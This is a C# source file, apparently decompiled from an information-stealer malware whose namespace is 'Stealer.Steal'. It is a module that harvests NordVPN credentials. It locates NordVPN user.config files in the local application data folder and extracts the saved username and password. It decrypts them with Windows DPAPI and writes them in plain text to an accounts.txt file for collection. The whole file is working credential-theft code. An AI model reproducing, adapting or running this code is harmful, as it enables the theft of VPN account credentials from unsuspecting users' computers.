using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.VPN;

internal class NordVpn
{
	private static string Decode(string s)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}

	public static void Start()
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		try
		{
			string text = Path.Combine("VPN", "NordVPN");
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				List<string> list = new List<string>();
				string text2 = "";
				DirectoryInfo[] directories2 = directoryInfo2.GetDirectories();
				foreach (DirectoryInfo directoryInfo3 in directories2)
				{
					string text3 = Path.Combine(directoryInfo3.FullName, "user.config");
					if (File.Exists(text3))
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text3);
						string text4 = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
						string text5 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
						if (text4 != null && !string.IsNullOrEmpty(text4) && text5 != null && !string.IsNullOrEmpty(text5))
						{
							string text6 = Decode(text4);
							string text7 = Decode(text5);
							Counter.Vpn++;
							list.Add("Username: " + text6 + "\nPassword: " + text7);
							text2 = directoryInfo3.Name;
						}
					}
				}
				DynamicFiles.WriteAllText(text + "\\" + text2 + "\\accounts.txt", string.Join("\n\n", (IEnumerable<string?>)list.ToArray()));
			}
		}
		catch
		{
		}
	}
}
